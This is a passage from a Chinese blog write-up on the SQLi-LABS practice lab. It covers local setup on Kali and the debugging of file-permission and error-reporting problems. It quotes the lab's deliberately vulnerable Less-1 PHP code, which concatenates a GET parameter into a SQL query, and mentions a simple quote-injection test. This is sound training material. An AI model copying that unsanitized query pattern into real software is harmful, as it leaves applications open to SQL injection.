<script>"serviceWorker"in navigator&&window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})).them((()=>{"true"!=window.localStorage.getItem("install")&&(window.localStorage.setItem("install","true"),location.reload())}))</script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SQLi-LABS-完整训练 | h-t-m</title><meta name="keywords" content="CTF,网络安全,SQL 注入"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="再一次进入大长篇，怒刷 SQLi-LABS"><meta property="og:type" content="article"><meta property="og:title" content="SQLi-LABS-完整训练"><meta property="og:url" content="https://h-t-m.top/posts/8a881eff/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="再一次进入大长篇，怒刷 SQLi-LABS"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/SQLi-LABS.webp"><meta property="article:published_time" content="2022-10-24T06:10:55.000Z"><meta property="article:modified_time" content="2023-01-02T06:13:44.320Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="CTF"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="SQL 注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/SQLi-LABS.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/8a881eff/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#132c33"><link rel="apple-touch-icon" sizes="180x180" href="/logo/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/logo/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/logo/favicon-16x16.png"><link rel="mask-icon" href="/logo/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:50,languages:{author:"作者: h-t-m",link:"链接: ",source:"来源: h-t-m",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"SQLi-LABS-完整训练",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2023-01-02 14:13:44"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/carousel-touch.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">58</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://pic.h-t-m.ltd/img/BUUCTF-top.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQLi-LABS-完整训练</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T06:10:55.000Z" title="发表于 2022-10-24 14:10:55">2022-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-02T06:13:44.320Z" title="更新于 2023-01-02 14:13:44">2023-01-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/">靶场训练</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">37.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>130分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="SQLi-LABS-完整训练"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>SQLi-LABS-完整训练</h1><blockquote><p><strong>前言</strong></p><p>按顺序在 <a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a> 刷题，这不刚刷完文件上传的专题不久，又进入了 SQL 注入专题，迟迟不敢动手，毕竟 <a href="https://h-t-m.top/posts/ddd5444f/">upload-labs-完整训练</a> 中的痛苦过程依然历历在目。</p><p>不过还是得面对，小小的 SQL 注入，难道还能学不会不成？</p><p>这篇文章将分为五个部分，首先是环境配置，往后对于此类练习平台，都将部署于本地。虽然得不到 BUU 的肯定，但我们确实很有必要保证环境可控。此外在实战中遇到的有关环境的问题也将汇总于该部分，并详细记录解决过程。然后的四部分则分别对应于 SQLi-LABS 中的 Basic Challengs（基础挑战）、 Advanced Injections（高级注入）、 Stacked Injections（堆叠注入）、 Challengs（进阶挑战）。</p><p>由于图片数量非常可观，因此本文中出现的图片全部存储于 <a target="_blank" rel="noopener" href="https://7bu.top/">去不图床</a> ，若失效或遇到其他问题请及时联系本人。</p><p>特别感谢平台作者 <a target="_blank" rel="noopener" href="https://github.com/Audi-1">Audi-1</a> 及博主所用版本的作者 <a target="_blank" rel="noopener" href="https://github.com/mukkul007">mukkul007</a></p></blockquote><h2 id="环境配置-3">环境配置</h2><ul><li><p>鉴于对 Linux 系统学习的需求，环境也将不应再约束于 Windows 中了，然而在博主电脑中常驻的 Linux 系统就只有 <kbd>Kali</kbd>，显然，应该由 <kbd>Kali</kbd> 来担此重任。</p></li><li><p>首先，需要开启 <kbd>Apache</kbd> 服务，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure><p>其中 <kbd>sudo</kbd> 表示用管理员身份执行命令。开启成功后打开浏览器访问 <kbd>localhost</kbd> 即本机地址，看到如下界面说明开启成功：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a455be6.webp" alt="" style="zoom:50%"></li><li><p>然后需要开启 <kbd>MySQL</kbd>服务，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql start</span><br></pre></td></tr></table></figure><p>完成之后输入以下命令尝试登录 <kbd>MySQL</kbd> 同时验证是否开启成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><p>其中 <kbd>-uroot</kbd> 表示登录用户名为 <kbd>root</kbd>，<kbd>-p</kbd> 后接密码，留空则将引导隐藏输入密码。初始状态密码为空。如下图所示即为登录成功：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a7d2d0d.webp" alt="" style="zoom:75%"><p>登录后可使用以下命令修改密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> password <span class="keyword">for</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span><span class="operator">=</span>password(<span class="string">&#x27;新密码&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>接下来就可以安装平台了，首先使用以下命令将工作目录移动至 <kbd>/var/www/html</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><p>然后将整个平台的文件存放至此目录，本机地址加文件夹名即可在浏览器中成功访问平台，使用以下命令将 GitHub 上的 <a target="_blank" rel="noopener" href="https://github.com/mukkul007/sqli-labs-kali2">sqli-labs-kali2</a> 项目克隆至当前目录，并设置文件夹名称为 <kbd>sqli-labs</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mukkul007/sqli-labs-kali2 sqli-labs</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件实现平台与数据库的连接，配置文件为平台目录下的 <kbd>sql-connections</kbd> 文件夹下的 <kbd>db-creds.inc</kbd> 文件，使用以下两条命令即可打开该文件，文件内容如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd sqli-labs/sql-connections/</span><br><span class="line">vi db-creds.inc</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/07/05/62c3e5a441a52.webp" alt="" style="zoom:75%"><p>其中 <kbd>dbuser</kbd> 与 <kbd>dbpass</kbd> 分别代表用户名与密码，实测密码不能为空，可参照上一条修改密码。由于使用 <kbd>vim</kbd> 打开，需要先按 <kbd>i</kbd> 键进行编辑，编辑完成后按 <kbd>Esc</kbd> 键退出编辑返回命令模式，输入 <kbd>:wq</kbd> 保存并退出即完成配置。</p></li><li><p>在浏览器地址栏中输入地址 <kbd>http://localhost/sqli-labs/</kbd> 即可访问平台，其中 <kbd>sqli-labs</kbd> 即平台目录的名称。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a454f15.webp" alt="" style="zoom:75%"><p>当然到这里并没有结束，还需要点击第二栏 <kbd>Setup/reset Database for labs</kbd> 正式连接数据库，如下图所示即为连接成功：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a826b82.webp" alt="" style="zoom:75%"></li></ul><h3 id="问题汇总">问题汇总</h3><div class="tip error"><p>参照网络上的教程，完成以上步骤基本就可以了，很遗憾的是，或许是具体环境的不同，笔者在操作时依然遇到了一些困难，本着博客纪实原则，同时便于日后参考，现将环境类问题及解决过程汇总于此。</p></div><h4 id="权限问题（PHP）">权限问题（PHP）</h4><ul><li><p>问题描述</p><p>  在完成环境部署之后，数据库也连接成功，然而在第一次尝试注入时，网页只剩下 <kbd>Welcome Dhakkan</kbd>，同时服务器返回错误码 <kbd>500</kbd>，无论刷新或是改变 GET 请求值均无变化。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a53c522.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  在 SQLi-LABS 部署过程中，最常见的环境问题便是 PHP 版本不兼容，主要是 PHP7+ 版本不兼容，这里使用的是 <kbd>mukkul007</kbd> 提供的修改版本，代码是可以顺利运行在 Kali2.0 上的，并且据网友实测也是可以运行在近期的 Kali 版本中的。但是由于笔者热衷于使用最新版，因此很难不怀疑是新版本所导致的。</p><p>  输入命令 <kbd>php -v</kbd> 查询系统自带的 PHP 版本，得知为 PHP 8.1.2。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a53f234.webp" alt="" style="zoom:75%"><p>  盲目降级来解决问题不可取，因此还是调试源码（以 Less-1 源码为例），如果能发现是哪里出现问题，说不定可以在 <kbd>mukkul007</kbd> 的修改版基础之上推出适配 Kali2022 的 SQLi-LABS。源码关键部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line"><span class="comment">// 若通过 GET 方法传递了 id 变量则进入 if 语句</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="comment">// 打开文件并在末尾加上本次传递的值</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">// 若查询成功则输出结果</span></span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">// 若查询失败则输出错误提示</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line">	<span class="comment">// 若未通过 GET 方法传递 id 变量，则输出上方语句</span></span><br></pre></td></tr></table></figure><p>  由于在未传递变量时网页输出正常，因此问题出在 <kbd>if</kbd> 语句中，为了解程序中断于哪部分，笔者在每条语句后添加输出语句输出不同字符串，如下图所示，实测程序中断于 <kbd>fwrite()</kbd> 函数。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a614628.webp" alt="" style="zoom:75%"><p>  因此，程序执行打开文件操作正常，而执行写入文件失败，为确定问题仅发生于文件操作，我将该部分代码注释，实测将 <kbd>fwrite()</kbd> 与 <kbd>fclose()</kbd> 两个函数注释后，程序可以正常运行，因此可以确定问题出于这两个函数上。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a620cf4.webp" alt="" style="zoom:75%"><p>  查询 PHP 官方手册中对于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration80.incompatible.php">PHP 7.4.x 到 8.0.x</a> 以及 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration81.incompatible.php">PHP 8.0.x 到 8.1.x</a> 的不向后兼容的变更内容，并没有发现对于文件写入与关闭操作的变更，因此，很有可能并不是 PHP 版本所引起的错误。为了验证这一点，我将这部分源码复制到了编译器中，同时添加了字符串的输出与文件写入，解释器使用 PHP 8.1.2 版本，当传入参数 <kbd>id</kbd> 时，程序运行正常！</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a616331.webp" alt="" style="zoom:75%"><p>  程序对于文件的打开操作可以正常执行，但是却无法修改与关闭文件，由上又排除了 PHP 本身的问题，因此基本可以认为，是<strong>权限问题</strong>。也就是说，程序对文件只有只读权限。查看该文本文件的权限，可以看到，只有 <kbd>root</kbd> 用户具有读写权限，此外包括 <kbd>root</kbd> 组内其他成员在内的所有成员都只有只读权限。将其他部分改为读写权限后，程序可以照常运行（注：修改权限需 <kbd>root</kbd> 权限）。因此，造成该错误的原因就是程序的权限不够且程序的执行用户并非 <kbd>root</kbd>，也不属于 <kbd>root</kbd> 用户组。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a8e2cad.webp" alt="" style="zoom:75%"><p>  知道这些当然还不够，虽然直接给权限就行了，但直接将所有用户赋予读写权限，显然不是一个搞安全的该干的事，因此，应该了解程序执行所用的是哪个用户，且仅赋予该用户对网页范围内的读写权限，当然，权限可进一步细分。</p></li><li><p>解决方案</p><p>  首先查询执行用户，这个用户实际上就是 <kbd>Apache</kbd> 所使用的执行用户，在目录 <kbd>/etc/apache2</kbd> 中的 <kbd>envvars</kbd> 文件中即可查看。如图所示用户为 <kbd>www-data</kbd> 所属用户组为 <kbd>www-data</kbd>。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5ae90709.webp" alt="" style="zoom:75%"><p>  赋予上述用户对于平台根目录读写权限并递归应用即可，平台目录为 <kbd>/var/www/html/sqli-labs</kbd>，即环境部署时文件拷贝的目录。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a90935b.webp" alt="" style="zoom:75%"><p>  在浏览器中执行注入，回显成功，问题解决！</p><img src="https://bu.dusays.com/2022/07/05/62c3e5aa0e72a.webp" alt="" style="zoom:75%"></li></ul><h4 id="错误处理问题">错误处理问题</h4><ul><li><p>问题描述</p><p>  在源代码中有一段是可以在 SQL 语句出错时输出错误信息的，比如 Less-1 中注入 <kbd>id=1&#39;</kbd> 时，多余的单引号会导致语法错误，因此网页此时应输出错误提示，但是在实际操作时，网页只能显示标题同时服务器返回错误码 <kbd>500</kbd>。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5a90944c.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  首先，在无语法问题时浏览器可以正常回显，说明数据库连接正常且可以完成正常查询，因此错误应发生在带有语法错误的 SQL 语句执行函数上，即 <kbd>mysqli_query()</kbd> 函数。通过在代码中插入输出语句可以验证这一点：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5aa36770.webp" alt="" style="zoom:75%"><p>  将关键代码移动至编译器中进一步调试，发现查询在执行至 <kbd>mysqli_query()</kbd> 函数时结束了进程，退出代码 <kbd>255</kbd> 表示查询异常退出。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5aa0e94a.webp" alt="" style="zoom:75%"><p>  源代码中的 <kbd>error_reporting(0)</kbd> 表示设置报错级别为 